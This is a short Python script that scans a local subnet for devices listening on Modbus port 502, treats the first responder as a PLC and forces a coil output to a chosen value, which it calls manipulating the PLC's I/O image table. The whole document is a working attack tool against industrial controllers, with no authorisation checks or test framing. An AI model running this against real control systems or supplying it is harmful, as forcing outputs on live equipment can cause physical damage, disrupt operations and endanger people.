from pymodbus.client import ModbusTcpClient
from pymodbus.payload import BinaryPayloadBuilder, BinaryPayloadDecoder
from pymodbus.constants import Endian
import socket

def find_plc_ip_address(network_prefix="192.168.1."):
    """
    Scans the network to find the PLC's IP address.
    Assumes the PLC is on the same subnet and responds to ping.
    """
    for i in range(1, 255):
        ip = network_prefix + str(i)
        try:
            # Ping the IP address
            socket.create_connection((ip, 502), timeout=1)
            print(f"Found PLC at IP address: {ip}")
            return ip
        except (socket.timeout, ConnectionRefusedError):
            continue
    raise Exception("PLC IP address not found on the network.")

def manipulate_io_image(plc_ip, output_address, force_value):
    """
    Manipulates the I/O image table of the PLC by forcing an output value.
    :param plc_ip: IP address of the PLC
    :param output_address: Modbus address of the output to override
    :param force_value: Value to force (0 or 1)
    """
    # Connect to the PLC
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        raise Exception("Failed to connect to the PLC.")

    try:
        # Force the output value
        print(f"Forcing output at address {output_address} to {force_value}")
        client.write_coil(output_address, force_value)
        print("I/O image manipulation successful.")
    except Exception as e:
        print(f"Error manipulating I/O image: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    try:
        # Step 1: Find the PLC's IP address
        plc_ip = find_plc_ip_address()
        
        # Step 2: Manipulate the I/O image table
        output_address = 0  # Replace with the actual Modbus address of the output
        force_value = 1     # Replace with the desired value (0 or 1)
        manipulate_io_image(plc_ip, output_address, force_value)
    except Exception as e:
        print(f"Script failed: {e}")